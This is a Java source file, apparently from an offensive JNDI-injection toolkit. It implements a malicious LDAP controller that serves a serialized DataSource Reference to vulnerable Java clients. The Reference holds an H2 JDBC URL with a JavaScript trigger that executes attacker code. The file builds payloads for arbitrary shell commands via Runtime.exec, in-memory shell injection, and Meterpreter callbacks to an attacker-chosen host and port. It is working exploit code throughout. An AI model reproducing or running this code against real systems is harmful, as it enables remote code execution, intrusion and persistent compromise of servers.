package com.qi4l.JYso.controllers;

import com.qi4l.JYso.enumtypes.GadgetType;
import com.qi4l.JYso.exceptions.IncorrectParamsException;
import com.qi4l.JYso.exceptions.UnSupportedPayloadTypeException;
import com.qi4l.JYso.gadgets.Config.Config;
import com.qi4l.JYso.gadgets.utils.Gadgets;
import com.qi4l.JYso.gadgets.utils.InjShell;
import com.qi4l.JYso.gadgets.utils.Util;
import com.qi4l.JYso.gadgets.utils.handle.ClassNameHandler;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.naming.StringRefAddr;
import java.io.IOException;
import java.lang.reflect.Field;
import javax.naming.Reference;

import static org.fusesource.jansi.Ansi.ansi;

@LdapMapping(uri = {"/tomcatjdbc"})
public class TomcatJdbcController implements LdapController {

    private String     payloadType;

    private String     factoryType;
    private String[]   params;
    private GadgetType gadgetType;

    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        try {
            System.out.println(ansi().render("@|green [+] Sending LDAP ResourceRef result for|@" + base + "  @|green with javax.el.ELProcessor payload|@"));
            System.out.println("-------------------------------------- JNDI Local  Refenrence Links --------------------------------------");

            // create a TeraDataSource object, holding  our JDBC string
            // org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory
            // org.apache.tomcat.dbcp.dbcp.BasicDataSourceFactory
            // org.apache.commons.dbcp2.BasicDataSourceFactory
            // org.apache.commons.dbcp.BasicDataSourceFactory
            // com.alibaba.druid.pool.DruidDataSourceFactory
            // org.apache.tomcat.jdbc.pool.DataSourceFactory
            Entry                                   e      = new Entry(base);
            Reference                               ref    = new Reference("javax.sql.DataSource", factoryType, null);
            TomcatJdbcController.TomcatBypassHelper helper = new TomcatJdbcController.TomcatBypassHelper();
            String                                  code   = null;

            if (payloadType.contains("E-")) {
                String      ClassName1 = payloadType.substring(payloadType.indexOf('-') + 1);
                final Class EchoClass  = Class.forName(ClassNameHandler.searchClassByName(ClassName1));
                code = InjShell.injectClass(EchoClass);
            }

            if (payloadType.contains("M-")) {
                String ClassName1 = payloadType.substring(payloadType.indexOf('-') + 1);
                InjShell.init(params);
                code = Gadgets.createClassT(ClassName1);
            }

            if (payloadType.contains("command")) {
                code = helper.getExecCode(params[0]);
            }

            if (payloadType.contains("meterpreter")) {
                code = helper.injectMeterpreter();
            }

            String JDBC_URL = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n" +
                    "INFORMATION_SCHEMA.TABLES AS $$//javascript\n" +
                    "{replacement}\n" +
                    "$$\n";
            String JDBC_URL1 = JDBC_URL.replace("{replacement}", code);
            ref.add(new StringRefAddr("driverClassName","org.h2.Driver"));
            ref.add(new StringRefAddr("url",JDBC_URL1));
            ref.add(new StringRefAddr("username","root"));
            ref.add(new StringRefAddr("password","password"));
            ref.add(new StringRefAddr("initialSize","1"));
            e.addAttribute("javaClassName", "java.lang.String");
            e.addAttribute("javaSerializedData", Util.serialize(ref));
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        } catch (Throwable er) {
            System.err.println("Error while generating or serializing payload");
            er.printStackTrace();
        }
    }

    @Override
    public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException {
        try {
            base = base.replace('\\', '/');
            int fistIndex   = base.indexOf("/");
            int secondIndex = base.indexOf("/", fistIndex + 1);
            if (secondIndex < 0) secondIndex = base.length();

            try {
                payloadType = base.substring(fistIndex + 1, secondIndex);
                System.out.println(ansi().render("@|green [+] PaylaodType : |@" + payloadType));
            } catch (IllegalArgumentException e) {
                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType : " + base.substring(fistIndex + 1, secondIndex));
            }

            int thirdIndex = base.indexOf("/", secondIndex + 1);
            if (thirdIndex < 0) thirdIndex = base.length();

            try {
                factoryType = base.substring(secondIndex + 1, thirdIndex);
                System.out.println(ansi().render("@|green [+] FactoryType : |@" + factoryType));
            } catch (IllegalArgumentException e) {
                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType : " + base.substring(fistIndex + 1, secondIndex));
            }

            int fourthIndex = base.indexOf("/", thirdIndex + 1);

            if (fourthIndex != -1) {
                if (fourthIndex < 0) fourthIndex = base.length();
                try {
                    gadgetType = GadgetType.valueOf(base.substring(thirdIndex + 1, fourthIndex).toLowerCase());
                } catch (IllegalArgumentException e) {
                    throw new UnSupportedPayloadTypeException("UnSupportedPayloadType : " + base.substring(thirdIndex + 1, fourthIndex));
                }
            }

            if (gadgetType == GadgetType.base64) {
                String cmd = Util.getCmdFromBase(base);
                System.out.println(ansi().render("@|green [+] Command : |@" + cmd));
                params = new String[]{cmd};
            }

            if (gadgetType == GadgetType.shell) {
                String   cmd1         = Util.getCmdFromBase(base);
                byte[]   decodedBytes = Util.base64Decode(cmd1);
                String   cmd          = new String(decodedBytes);
                String[] cmdArray     = cmd.split(" ");
                System.out.println(ansi().render("@|green [+] Command : |@" + cmd));
                params = cmdArray;
            }

            if (gadgetType == GadgetType.msf) {
                String[] results1 = Util.getIPAndPortFromBase(base);
                Config.rhost = results1[0];
                Config.rport = results1[1];
                System.out.println("[+] RemotHost: " + results1[0]);
                System.out.println("[+] RemotPort: " + results1[1]);
                params = results1;
            }
        } catch (Exception e) {
            if (e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException) e;

            throw new IncorrectParamsException("Incorrect params: " + base);
        }
    }

    private class TomcatBypassHelper {

        public String injectMeterpreter() throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
            Class<?> ctClazz      = Class.forName("com.qi4l.JYso.template.Meterpreter");
            Field    WinClassName = ctClazz.getDeclaredField("host");
            WinClassName.setAccessible(true);
            WinClassName.set(ctClazz, params[0]);
            Field WinclassBody = ctClazz.getDeclaredField("port");
            WinclassBody.setAccessible(true);
            WinclassBody.set(ctClazz, params[1]);
            return InjShell.injectClass(ctClazz);
        }

        public String getExecCode(String cmd) throws IOException {

            String code = "var strs=new Array(3);\n" +
                    "        if(java.io.File.separator.equals('/')){\n" +
                    "            strs[0]='/bin/bash';\n" +
                    "            strs[1]='-c';\n" +
                    "            strs[2]='" + cmd + "';\n" +
                    "        }else{\n" +
                    "            strs[0]='cmd';\n" +
                    "            strs[1]='/C';\n" +
                    "            strs[2]='" + cmd + "';\n" +
                    "        }\n" +
                    "        java.lang.Runtime.getRuntime().exec(strs);";

            return code;
        }
    }
}
